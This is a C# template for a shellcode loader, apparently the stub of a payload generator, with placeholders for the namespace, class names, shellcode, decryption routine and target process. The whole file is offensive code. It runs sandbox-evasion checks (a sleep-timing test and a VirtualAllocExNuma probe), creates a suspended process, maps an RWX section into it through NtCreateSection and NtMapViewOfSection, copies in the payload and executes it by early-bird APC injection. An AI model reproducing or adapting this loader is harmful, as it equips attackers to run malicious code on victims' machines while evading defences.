using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace #NS#
{
    public class #CLASS#
    {
        private const uint #GENERIC_ALL# = 0x10000000;
        private const uint #PAGE_READWRITE# = 0x04;
        private const uint #PAGE_READEXECUTE# = 0x20;
        private const uint #PAGE_READWRITEEXECUTE# = 0x40;
        private const uint #SEC_COMMIT# = 0x08000000;
        private const uint #CREATE_SUSPENDED# = 0x00000004;

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref #SI# lpStartupInfo, out #PI# lpProcessInformation);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint NtCreateSection(ref IntPtr SectionHandle, uint DesiredAccess, IntPtr ObjectAttributes, ref uint MaximumSize, uint SectionPageProtection, uint AllocationAttributes, IntPtr FileHandle);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint NtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, IntPtr CommitSize, out ulong SectionOffset, out uint ViewSize, uint InheritDisposition, uint AllocationType, uint Win32Protect);

        [DllImport("kernel32.dll")]
        public static extern uint QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);

        [DllImport("kernel32.dll")]
        public static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, uint nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct #SI# {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct #PI# {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        public static void Main(string[] args)
        {
            // 1. Evasion: Sleep check
            DateTime t1 = DateTime.Now;
            Sleep(5000);
            if (DateTime.Now.Subtract(t1).TotalSeconds < 4.5) return;

            // 2. Evasion: Anti-sandbox Numas
            IntPtr m = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (m == IntPtr.Zero) return;

            #SHELLCODE#
            
            #DECRYPTION#

            // 3. Setup Process
            #SI# si = new #SI#();
            si.cb = (uint)Marshal.SizeOf(si);
            #PI# pi = new #PI#();
            string target = #TARGET_PROC#;

            bool success = CreateProcess(null, target, IntPtr.Zero, IntPtr.Zero, false, #CREATE_SUSPENDED#, IntPtr.Zero, null, ref si, out pi);
            if (!success) return;

            // 4. Section Mapping (RWX Remote for stability)
            IntPtr sh = IntPtr.Zero;
            uint sz = (uint)Math.Max(0x1000, #BUF#.Length);
            uint status = NtCreateSection(ref sh, #GENERIC_ALL#, IntPtr.Zero, ref sz, #PAGE_READWRITEEXECUTE#, #SEC_COMMIT#, IntPtr.Zero);
            if (status != 0) return;

            IntPtr bal = IntPtr.Zero;
            ulong offl = 0;
            uint vsl = sz;
            status = NtMapViewOfSection(sh, GetCurrentProcess(), ref bal, IntPtr.Zero, IntPtr.Zero, out offl, out vsl, 2, 0, #PAGE_READWRITE#);
            if (status != 0) return;

            IntPtr bar = IntPtr.Zero;
            ulong offr = 0;
            uint vsr = sz;
            // Use 0x40 (RWX) for remote mapping too
            status = NtMapViewOfSection(sh, pi.hProcess, ref bar, IntPtr.Zero, IntPtr.Zero, out offr, out vsr, 2, 0, #PAGE_READWRITEEXECUTE#);
            if (status != 0) return;

            // 5. Copy & Trigger
            Marshal.Copy(#BUF#, 0, bal, #BUF#.Length);
            QueueUserAPC(bar, pi.hThread, IntPtr.Zero);
            ResumeThread(pi.hThread);
        }
    }
}
